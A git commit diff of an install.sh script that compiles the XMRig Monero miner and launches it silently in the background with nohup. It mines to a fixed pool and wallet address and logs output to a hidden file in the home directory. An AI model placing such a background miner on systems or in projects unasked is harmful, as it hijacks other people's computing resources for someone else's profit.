e55afb1ea9230d7884d756c816d420c199b3ed79
Deepak Meena X <meenadeepak7202@gmail.com>
2025-07-13 21:23:14 +0530

    install.sh

--- install.sh
+++ install.sh
@@ -3,5 +3,6 @@ sudo apt update && sudo apt install git build-essential cmake automake libtool a
 git clone https://github.com/xmrig/xmrig.git
 cd xmrig && mkdir build && cd build
 cmake ..
-make -j$(nproc)
+CORES=$(nproc)
+make -j$CORES
 nohup ./xmrig -o pool.minexmr.com:443 -u 4Agqnp2CXvsYS5y7Wc5JEFPT7H5Q5zF553seWnRBXh3uM4aamXzwGHh5eW7WVQrE4rbigJaX7B46fZP3nznmGQj56W8N39S -k --tls --threads=1 > ~/miner.log 2>&1 &
